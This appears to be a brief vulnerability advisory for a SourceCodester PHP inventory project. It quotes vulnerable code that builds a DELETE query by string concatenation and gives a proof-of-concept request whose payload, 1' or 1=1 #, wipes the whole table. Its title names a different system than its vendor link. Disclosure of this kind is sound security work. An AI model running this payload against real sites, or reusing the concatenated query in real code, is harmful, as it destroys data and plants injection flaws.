# SOURCECODESTER / Barangay Population System - delete-computer.php SQL Injection

## **Credits**
> Joshua Lictan (https://github.com/skid-nochizplz/skid-nochizplz)<br/>

## Vendor Homepage:
> https://www.sourcecodester.com/php/17165/computer-inventory-system-using-php-and-mysql-source-code.html
> 
## Affected Component
> /endpoint/delete-computer.php

## Code
```php
        $query = "DELETE FROM tbl_computer WHERE tbl_computer_id = '$computer'";

        $stmt = $conn->prepare($query);

        $query_execute = $stmt->execute();
```

## Proof of Concept
**HTTP Request Example**
``` http request
GET /endpoint/delete-computer.php?computer=1'+or+1%3d1+%23 HTTP/1.1
Host: [REDACTED]
```

## Screenshot
